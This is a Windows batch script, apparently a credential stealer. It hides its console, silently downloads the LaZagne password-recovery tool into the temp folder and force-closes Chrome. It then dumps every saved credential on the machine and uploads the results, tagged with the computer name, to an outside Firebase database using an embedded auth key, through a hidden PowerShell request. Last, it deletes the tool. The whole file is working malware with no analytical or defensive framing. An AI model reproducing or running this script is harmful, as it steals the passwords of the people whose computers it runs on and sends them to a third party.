@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: Minimize the console window
start /min cmd /c "%~f0" && exit

:: Settings
set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"

:: 1. LaZagne check and download
if not exist "%LAZAGNE_EXE%" (
    powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'" >nul 2>&1
    if not exist "%LAZAGNE_EXE%" (
        exit /b 1
    )
)

:: 2. Chrome closure
tasklist /FI "IMAGENAME eq chrome.exe" 2>nul | find /I "chrome.exe" >nul
if %errorlevel% == 0 (
    taskkill /IM chrome.exe /F >nul 2>&1
)

:: 3. Output directory creation
if not exist "%OUTPUT_DIR%" (
    mkdir "%OUTPUT_DIR%" >nul 2>&1
    if errorlevel 1 (
        exit /b 1
    )
)

:: 4. Data collection
if not exist "%LAZAGNE_EXE%" (
    exit /b 1
)
"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1
if errorlevel 1 (
    exit /b 1
)

:: Check for result file
for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"
if not defined RESULT_FILE (
    exit /b 1
)

:: 5. Firebase upload
set "PC_NAME=%COMPUTERNAME%"
set "PC_NAME=!PC_NAME: =_!"
set "PC_NAME=!PC_NAME:-=_!"
powershell -WindowStyle Hidden -Command "$content=Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%'; $json=@{'computer'='%PC_NAME%';'timestamp'='%DATE% %TIME%';'data'=$content} | ConvertTo-Json -Compress; $response=Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json'" >nul 2>&1
if errorlevel 1 (
    exit /b 1
)

:: Cleanup
del /q "%LAZAGNE_EXE%" >nul 2>&1

exit /b 0
